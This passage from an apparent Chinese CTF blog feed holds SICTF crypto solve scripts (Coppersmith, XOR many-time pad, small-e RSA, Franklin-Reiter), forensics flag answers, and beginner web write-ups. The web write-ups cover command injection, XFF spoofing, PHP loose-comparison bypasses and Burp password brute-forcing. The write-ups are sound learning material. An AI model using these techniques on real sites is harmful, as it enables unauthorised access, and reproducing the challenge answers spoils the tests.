href=\"#pwn\">#</a> Pwn</h1>\n<h3 id=\"签到shop\"><a class=\"markdownIt-Anchor\" href=\"#签到shop\">#</a> [签到] Shop</h3>\n<p><img data-src=\"/img/sictfpic/15.png\" alt=\"img\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"古典大杂烩\"><a class=\"markdownIt-Anchor\" href=\"#古典大杂烩\">#</a> 古典大杂烩</h3>\n<pre><code class=\"language-PHP\">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱\n</code></pre>\n<p>emjio 解密</p>\n<pre><code class=\"language-PHP\">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z\n</code></pre>\n<p><img data-src=\"/img/sictfpic/16.png\" alt=\"img\"></p>\n<h3 id=\"radio\"><a class=\"markdownIt-Anchor\" href=\"#radio\">#</a> Radio</h3>\n<p><img data-src=\"/img/sictfpic/17.png\" alt=\"img\"></p>\n<h3 id=\"easy_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<pre><code class=\"language-Java\">from sage.all import *\nimport binascii\nfrom Crypto.Util.number import *\n\nn =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\ncipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\n\ne2 = 0x10001\npbits = 512\nfor i in range(0,2**4):\n    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590\n    p4=p4+int(hex(i),16)\n    print(hex(p4))\n    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数\n    print(p4.nbits())\n    p4 = p4 &lt;&lt; kbits\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + p4\n    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破\n    #print roots\n    if roots:        #爆破成功，求根\n        p = p4+int(roots[0])\n        print(&quot;p: &quot;, hex(int(p)))\n        assert n % p == 0\n        q = n/int(p)\n        print(&quot;q: &quot;, hex(int(q)))\n        print(gcd(p,q))\n        phin = (p-1)*(q-1)\n        print(gcd(e2,phin))\n        d = inverse_mod(e2,phin)\n        print(&quot;d：&quot;,d)\n        flag = pow(cipher,d,n)\n        flag = hex(int(flag))[2:]\n        result = &quot;&quot;\n        for i in range(0, len(flag), 2):\n            hex_int = int(flag[i:i+2], 16)  # 转换为整数\n            result += chr(hex_int)  # 转换为字符并拼接到结果字符串\n        print('result :',result)\n        \n# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;\n</code></pre>\n<h3 id=\"mingtianpao\"><a class=\"markdownIt-Anchor\" href=\"#mingtianpao\">#</a> MingTianPao</h3>\n<pre><code class=\"language-Python\">import codecs\nimport numpy as np\n\ndef is_character(x):\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')\n\ndef xor_strings(s1, s2):\n    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])\n\ndef infer_space(index, pos):\n    if message[index, pos] != 0:\n        return\n    message[index, pos] = ord(' ')\n    for x in range(len(ciphertexts)):\n        if x != index:\n            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')\n\ndef find_spaces():\n    for index, x in enumerate(ciphertexts):\n        res = [xor_strings(x, y) for y in ciphertexts if x != y]\n        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))\n        cnt = [f(pos) for pos in range(len(x))]\n        for pos in range(len(x)):\n            space_data.append((f(pos), index, pos))\n\nwith open('222.txt', 'r') as file:\n    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]\n\nmessage = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)\n\nspace_data = []\n\nfind_spaces()\n\nspace_data = sorted(space_data, reverse=True)\nfor weight, index, pos in space_data:\n    infer_space(index, pos)\n\nprint('\\n'.join([''.join([chr(c) for c in x]) for x in message]))\n</code></pre>\n<p>得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>\n<pre><code class=\"language-Python\">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;\nhex_str2 = &quot;Little Red Riding Hood promised&quot;\n\nbytes1 = bytes.fromhex(hex_str1)\nbytes2 = bytes(hex_str2, 'utf-8')\n\nresult = bytes([a ^ b for a, b in zip(bytes1, bytes2)])\n\nresult_str = result.decode('utf-8')\nprint(result_str)\n</code></pre>\n<h3 id=\"small_e\"><a class=\"markdownIt-Anchor\" href=\"#small_e\">#</a> small_e</h3>\n<p>低指数加密 /m 高位攻击</p>\n<p><img data-src=\"/img/sictfpic/18.png\" alt=\"img\"></p>\n<pre><code class=\"language-Python\">def phase2(high_m, n, c,e):\n    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')\n    m = high_m + x\n    M = m((m^e - c).small_roots()[0])\n    hex_str = hex(int(M))[2:]\n    print(hex_str)\n    return hex_str\n\nn = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\nc = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\nhigh_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\ne = 3\n\nhex_str = phase2(high_m, n, c,e)\n# 将16进制字符串转换为整数\nint_value = Integer('0x' + hex_str)\n\n# 将整数拆分为多个字节，并转换为对应的ASCII字符\nstr_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))\n\nprint(str_value)\n\n</code></pre>\n<h3 id=\"签到题来咯\"><a class=\"markdownIt-Anchor\" href=\"#签到题来咯\">#</a> 签到题来咯！</h3>\n<pre><code class=\"language-Python\">import libnum\nimport binascii\nfrom  Crypto.Util.number import *\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\ndef is_prime(n):\n    if n &lt;= 1:\n        return False\n    if n &lt;= 3:\n        return True\n    if n % 2 == 0 or n % 3 == 0:\n        return False\n    i = 5\n    while i * i &lt;= n:\n        if n % i == 0 or n % (i + 2) == 0:\n            return False\n        i += 6\n    return True    \ndef franklinReiter(n,e,c1,c2):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    g1 = (114*x+2333)^int(e) - c1\n    g2 = (514*x+4555)^int(e) - c2\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nfor i in range(1024):\n    if is_prime(i):\n        e = i\n        m=franklinReiter(n,e,c1,c2)\n        print(long_to_bytes((int(m))))\n</code></pre>\n<h1 id=\"forensics\"><a class=\"markdownIt-Anchor\" href=\"#forensics\">#</a> Forensics</h1>\n<h3 id=\"购物之旅\"><a class=\"markdownIt-Anchor\" href=\"#购物之旅\">#</a> 购物之旅</h3>\n<p>SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>\n<h3 id=\"美女姐姐\"><a class=\"markdownIt-Anchor\" href=\"#美女姐姐\">#</a> 美女姐姐</h3>\n<p>SICTF 福建省福州市仓山区烟台山公园}</p>\n<h3 id=\"宝塔镇河妖\"><a class=\"markdownIt-Anchor\" href=\"#宝塔镇河妖\">#</a> 宝塔镇河妖</h3>\n<p>SICTF 山东省济宁市汶上县太子灵踪塔}</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/08/24/web-new/",
            "url": "http://example.com/2023/08/24/web-new/",
            "title": "web_new",
            "date_published": "2023-08-24T15:55:12.000Z",
            "content_html": "<h1 id=\"web新手\"><a class=\"markdownIt-Anchor\" href=\"#web新手\">#</a> web 新手：</h1>\n<p>攻防世界 WEB 区复现：</p>\n<h2 id=\"robots\"><a class=\"markdownIt-Anchor\" href=\"#robots\">#</a> robots:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824195924438.png\" alt=\"image-20230824195924438\"></p>\n<blockquote>\n<p>robots.txt 文件是一个文本文件，使用任何一个常见的文本编辑器，比如 Windows 系统安装了 Notepad，就可以创建和编辑它</p>\n<p>robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>\n<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用 robots.txt 文件。如果您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。</p>\n<p>如果将网站视为酒店里的一个房间，robots.txt 就是主人在房间门口悬挂的 “请勿打扰” 或 “欢迎打扫” 的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但 robots.txt 不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824200258007.png\" alt=\"image-20230824200258007\"></p>\n<blockquote>\n<p>拙见：Disallow 就是禁止的意思</p>\n<p>​\t\t   Allow 就是允许的意思</p>\n</blockquote>\n<p>回归该题：</p>\n<p><img data-src=\"/img/webpic/image-20230824200522350.png\" alt=\"image-20230824200522350\"></p>\n<p>当我们去访问 robots.txt 的时候，发现所有的搜索引擎不允许去访问  f1ag_1s_h3re.php 文件，说明这是敏感信息。根据提示，我们去访问这个文件。</p>\n<p><img data-src=\"/img/webpic/image-20230824201130674.png\" alt=\"image-20230824201130674\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"backup\"><a class=\"markdownIt-Anchor\" href=\"#backup\">#</a> backup:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201515063.png\" alt=\"image-20230824201515063\"></p>\n<blockquote>\n<p>提示是去寻找备份文件</p>\n</blockquote>\n<p>打开界面：</p>\n<p><img data-src=\"/img/webpic/image-20230824201448729.png\" alt=\"\"></p>\n<blockquote>\n<p>很容易想到，这里要找 index.php 的备份文件。</p>\n<p>web 网页常见的备份文件后缀名：“.git”,“.svn”,“.swp”,“.~”,“.bak”,“.bash_history”,“.bkf”</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824201722649.png\" alt=\"image-20230824201722649\"></p>\n<p><img data-src=\"/img/webpic/image-20230824201755816.png\" alt=\"image-20230824201755816\"></p>\n<p>获取 flag。</p>\n<h2 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\">#</a> cookie:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201926829.png\" alt=\"image-20230824201926829\"></p>\n<p>根据提示，cookie 里面有东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202025146.png\" alt=\"image-20230824202025146\"></p>\n<blockquote>\n<p>Cookie 是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个 Cookie 文件用于记录登录信息。目前，大多数网站都会应用 Cookie 技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。</p>\n<h2 id=\"cookie有哪些特性\"><a class=\"markdownIt-Anchor\" href=\"#cookie有哪些特性\">#</a> Cookie 有哪些特性:</h2>\n<p>首先，是 Cookie 的实效性。目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>\n<p>其次，是 Cookie 的限制性。Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p>\n<h2 id=\"cookie有什么作用\"><a class=\"markdownIt-Anchor\" href=\"#cookie有什么作用\">#</a> Cookie 有什么作用:</h2>\n<p>Cookie 对于网站开发者而言，从某个角度理解更像浏览器的 “缓存” 它清晰的记录你的行为指标，有利于：</p>\n<p>（1）获取精准的访客画像：用户位置、访问喜好、年龄结构、特定账号信息等。</p>\n<p>（2）广告联盟：提供更加精准的相关产品信息，这也是为什么，当你搜索某个产品以后，在各大电商网站或带有广告联盟代码的站点，经常出现同类产品的原因。</p>\n<p>（3）推进更多个性化的内容信息，延迟页面停留时间，提高转化率。</p>\n</blockquote>\n<p>这里我们采用 burp 抓一下包：</p>\n<p><img data-src=\"/img/webpic/image-20230824202352929.png\" alt=\"image-20230824202352929\"></p>\n<p>发现有一个 cookie.php, 尝试一下：</p>\n<p><img data-src=\"/img/webpic/image-20230824202455049.png\" alt=\"image-20230824202455049\"></p>\n<p>当我们传到 url 上的时候，提示我们请看 http response，所以 cookie 应该是在响应包的一个东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202815382.png\" alt=\"image-20230824202815382\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"disabled_button\"><a class=\"markdownIt-Anchor\" href=\"#disabled_button\">#</a> disabled_button:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203157237.png\" alt=\"image-20230824203157237\"></p>\n<p>当我们打开网页：</p>\n<p><img data-src=\"/img/webpic/image-20230824203237567.png\" alt=\"image-20230824203237567\"></p>\n<p>发现此按钮不能按下去。</p>\n<p><img data-src=\"/img/webpic/image-20230824203315948.png\" alt=\"image-20230824203315948\"></p>\n<p>f12 查看源码，发现输入有上面的字段：</p>\n<blockquote>\n<p>当 input 的属性设置为 disabled=“disabled“时，表单不会提交此 input 的数据</p>\n</blockquote>\n<blockquote>\n<p>disabled：对于全部的表单元素都有效，包括 select, radio, checkbox, button 等。若是一个输入项的 disabled 设为 true，则该表单输入项不能获取焦点，用户的全部操做（鼠标点击和键盘输入等）对该输入项都无效，最重要的一点是当提交表单时，这个表单输入项将不会被提交。</p>\n<p>readonly：只针对 input (text /password) 和 textarea 有效；若是设为 true，用户只是不能编辑对应的文本，可是仍然能够聚焦焦点，而且在提交表单的时候，该输入项会做为 form 的一项提交。</p>\n</blockquote>\n<p>所以我们将其删掉就行。</p>\n<p><img data-src=\"/img/webpic/image-20230824203628188.png\" alt=\"image-20230824203628188\"></p>\n<p><img data-src=\"/img/webpic/image-20230824203644118.png\" alt=\"image-20230824203644118\"></p>\n<p>得到 flag</p>\n<h2 id=\"get_post\"><a class=\"markdownIt-Anchor\" href=\"#get_post\">#</a> get_post:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203743132.png\" alt=\"image-20230824203743132\"></p>\n<p>两种请求方式：</p>\n<p><img data-src=\"/img/webpic/image-20230824204018624.png\" alt=\"image-20230824204018624\"></p>\n<blockquote>\n<p>GET 请求直接在 url 后，进行参数的添加。</p>\n<p>POST 请求需要借助 hackbar。</p>\n</blockquote>\n<p>另外几种请求：</p>\n<p><img data-src=\"/img/webpic/image-20230824204218269.png\" alt=\"image-20230824204218269\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204233311.png\" alt=\"image-20230824204233311\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204248645.png\" alt=\"image-20230824204248645\"></p>\n<p>回归题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824204355681.png\" alt=\"image-20230824204355681\"></p>\n<p>得到 flag</p>\n<h2 id=\"weak_auth\"><a class=\"markdownIt-Anchor\" href=\"#weak_auth\">#</a> weak_auth:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824204503329.png\" alt=\"image-20230824204503329\"></p>\n<p>题目是个弱密码题目：</p>\n<p>可以直接猜简单密码进行登录，也可以用 burp 进行爆破。</p>\n<p><img data-src=\"/img/webpic/image-20230824204634276.png\" alt=\"image-20230824204634276\"></p>\n<p>进入网页后是这样的界面。</p>\n<p><img data-src=\"/img/webpic/image-20230824204721446.png\" alt=\"image-20230824204721446\"></p>\n<p>当我们输入用户名时，提示我们用 admin 去登录。所以这题我们只需要去爆破密码即可。</p>\n<p>当我们请求操作时，拦截下来这样的数据包。</p>\n<p><img data-src=\"/img/webpic/image-20230824204915845.png\" alt=\"image-20230824204915845\"></p>\n<p>这样去构造 payload 去进行爆破密码</p>\n<p><img data-src=\"/img/webpic/image-20230824205021958.png\" alt=\"image-20230824205021958\"></p>\n<p>加载我们的密码字典，开始攻击</p>\n<p><img data-src=\"/img/webpic/image-20230824205112705.png\" alt=\"image-20230824205112705\"></p>\n<p>从长度获知密码应为 123456</p>\n<p><img data-src=\"/img/webpic/image-20230824205327991.png\" alt=\"image-20230824205327991\"></p>\n<p>查看响应包：</p>\n<p><img data-src=\"/img/webpic/image-20230824205351133.png\" alt=\"image-20230824205351133\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> simple_php:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824205450364.png\" alt=\"image-20230824205450364\"></p>\n<p><img data-src=\"/img/webpic/image-20230824205521655.png\" alt=\"image-20230824205521655\"></p>\n<p>发现是 php 去需要判断的再能获取两个部分的 flag 的。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>== 弱类型比较。需要了解 php 类型比较的特性。</p>\n<p><strong>PHP 类型比较</strong></p>\n<ul>\n<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>\n<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>\n</ul>\n<p>** 方法：**php 中的弱类型比较会使’abc’ == 0 为真，所以输入 a=abc 时，可得到 flag1</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>is_numeric () 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE, 且 php 中弱类型比较时，会使 (‘1234a’ == 1234)</p>\n<p>** 方法：** 输入 b=1235c 即可。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210310021.png\" alt=\"image-20230824210310021\"></p>\n<h2 id=\"command_execution\"><a class=\"markdownIt-Anchor\" href=\"#command_execution\">#</a> command_execution:&gt;</h2>\n<blockquote>\n<p>命令执行</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210429004.png\" alt=\"image-20230824210429004\"></p>\n<blockquote>\n<p><strong>WAF:</strong></p>\n<p>Web 应用程序防火墙（有时也简称为 WAF ）可以通过监视和过滤 Internet 与网站之间的 HTTP 通信来保护网站。</p>\n<p>一个 WAF 可以防止网站受跨站请求伪造的喜欢（被攻击 CSRF），本地文件包含（LFI），SQL 注入，跨站点脚本（XSS），等等。</p>\n<p>输入验证效果不佳的网站可能容易受到代码注入漏洞的攻击，这使攻击者试图让 SQL 语句潜行以访问未经授权的数据库。WAF 可以检测并阻止这些尝试。过时的库和软件也是易受攻击的领域，但 Web 应用程序防火墙可以用作临时解决方案，并阻止这些漏洞，并对其进行修补。</p>\n</blockquote>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824210729558.png\" alt=\"image-20230824210729558\"></p>\n<blockquote>\n<p>ping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP/IP 参数是否设置正确，以及运行是否正常、网络是否通畅等</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824211021366.png\" alt=\"image-20230824211021366\"></p>\n<p>发现有回显，这下来进行拼接，执行命令注入：</p>\n<p><img data-src=\"/img/webpic/image-20230824211133151.png\" alt=\"image-20230824211133151\"></p>\n<p>发现 ls 被执行。</p>\n<p><img data-src=\"/img/webpic/image-20230824211309540.png\" alt=\"image-20230824211309540\"></p>\n<p>找到 flag 位置</p>\n<p><img data-src=\"/img/webpic/image-20230824211410392.png\" alt=\"image-20230824211410392\"></p>\n<p>得到 flag</p>\n<h2 id=\"xff_referer\"><a class=\"markdownIt-Anchor\" href=\"#xff_referer\">#</a> xff_referer:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824211448543.png\" alt=\"image-20230824211448543\"></p>\n<p>记录一下：&gt;</p>\n<blockquote>\n<p>​\t**User-Agent：** 使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>\n<p>​\t**Cookie：** 网站为了辨别用户身份进行 session 跟踪，并储存在用户本地终端上的数据（通常经过加密）</p>\n<p>​\t <strong>X-Forwarded-For</strong>：简称 XFF 头，代表了 HTTP 的请求端真实的 IP。它被认为是客户端通过 HTTP 代理或者负载均衡器连接到 web 服务端获取源 ip 地址的一个标准（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库或某文件 [通过修改 XXF 头可以实现伪造 IP]）。</p>\n<p>​\t**Referer：** 浏览器向 WEB 服务器表明自己的页面来源。</p>\n<p>​\t**Host：** 客户端指定自己想访问的 WEB 服务器的域名 / IP 地址和端口号。</p>\n</blockquote>\n<blockquote>\n<p><strong>02XFF 注入的概念</strong></p>\n<p>​\tXFF，是 X-Forwarded-for 的缩写，属于 SQL 注入的一种，该注入原理是通过修改 X-Forwarded-for 头对带入系统的 dns 进行 sql 注入，达到欺骗服务器执行恶意的 SQL 命令的效果，从而可以得到网站的数据库内容。</p>\n<p><strong>03XFF 的危害</strong></p>\n<p>​\t①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p>\n<p>​\t②网页篡改：通过操作数据库对特定网页进行篡改。</p>\n<p>​\t③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p>\n<p>​\t④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</p>\n<p>​\t⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824212024008.png\" alt=\"image-20230824212024008\"></p>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824211956203.png\" alt=\"image-20230824211956203\"></p>\n<p>提示 ip 必须 123.123.123.123，利用 xff 伪造 ip。</p>\n<p>使用 burp</p>\n<p><img data-src=\"/img/webpic/image-20230824215131470.png\" alt=\"image-20230824215131470\"></p>\n<p>进行请求伪造：</p>\n<p><img data-src=\"/img/webpic/image-20230824215155754.png\" alt=\"image-20230824215155754\"></p>\n<p>得到 flag</p>\n<h2 id=\"training-www-robots\"><a class=\"markdownIt-Anchor\" href=\"#training-www-robots\">#</a> Training-WWW-Robots:&gt;</h2>\n<blockquote>\n<p>很明显，这还是一个和 Robots 有关的题目</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824215510884.png\" alt=\"image-20230824215510884\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215659606.png\" alt=\"image-20230824215659606\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215731279.png\" alt=\"image-20230824215731279\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_js\"><a class=\"markdownIt-Anchor\" href=\"#simple_js\">#</a> simple_js:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824215817083.png\" alt=\"image-20230824215817083\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215915164.png\" alt=\"image-20230824215915164\"></p>\n<p>题目界面</p>\n<p>用 burp 抓一下包。看下响应的情况。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 传入的密码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 需要比对的密码  // 这是报错信息  FAUX PASSWORD HAHA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 对传入的密码插入</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token 